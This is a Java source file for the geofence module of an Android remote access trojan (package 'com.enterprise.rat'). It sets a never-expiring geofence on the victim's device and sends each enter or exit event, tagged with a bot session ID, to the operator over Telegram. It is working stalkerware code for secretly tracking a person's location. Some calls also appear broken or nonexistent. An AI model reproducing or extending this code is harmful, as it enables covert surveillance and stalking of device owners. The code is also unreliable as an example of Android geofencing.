package com.enterprise.rat.commands;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.google.android.gms.location.Geofence;
import com.google.android.gms.location.GeofencingClient;
import com.google.android.gms.location.GeofencingRequest;
import com.google.android.gms.location.LocationServices;

public class GeofenceAlertManager {
    private Context context;
    private GeofencingClient geofencingClient;
    private static final String GEOFENCE_ID = "REX_GEOFENCE_1";

    public GeofenceAlertManager(Context context) {
        this.context = context;
        this.geofencingClient = LocationServices.getGeofencingClient(context);
    }

    public void setGeofence(double lat, double lng, float radius) {
        try {
            Geofence geofence = new Geofence.Builder()
                .setRequestId(GEOFENCE_ID)
                .setCircularRegion(lat, lng, radius)
                .setExpirationDuration(Geofence.NEVER_EXPIRE)
                .setTransitionTypes(Geofence.GEOFENCE_TRANSITION_ENTER | Geofence.GEOFENCE_TRANSITION_EXIT)
                .build();

            GeofencingRequest request = new GeofencingRequest.Builder()
                .setInitialTrigger(GeofencingRequest.INITIAL_TRIGGER_ENTER)
                .addGeofence(geofence)
                .build();

            Intent intent = new Intent(context, GeofenceBroadcastReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);

            geofencingClient.addGeofences(request, pendingIntent).addOnSuccessListener(aVoid ->
                TelegramApi.sendMessage("🗺 Geofence set at " + lat + "," + lng + " radius " + radius + "m.")
            ).addOnFailureListener(e ->
                TelegramApi.sendMessage("❌ Geofence error: " + e.getMessage())
            );
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Geofence requires Google Play Services.");
        }
    }

    public void removeGeofence() {
        geofencingClient.removeGeofences(LocationServices.getGeofencingClient(context).removeGeofences(null));
        TelegramApi.sendMessage("🗺 Geofence removed.");
    }

    public static class GeofenceBroadcastReceiver extends android.content.BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            com.google.android.gms.location.GeofencingEvent event =
                com.google.android.gms.location.GeofencingEvent.fromIntent(intent);
            if (event != null && !event.getGeofenceTransitionDetails().isEmpty()) {
                int transition = event.getGeofenceTransition();
                String type = (transition == Geofence.GEOFENCE_TRANSITION_ENTER) ? "ENTER" :
                             (transition == Geofence.GEOFENCE_TRANSITION_EXIT) ? "EXIT" : "UNKNOWN";
                TelegramApi.sendMessage("📍 Geofence Alert: Device " + type + " the zone.\nSession: " + BotConfig.SESSION_ID);
            }
        }
    }
}
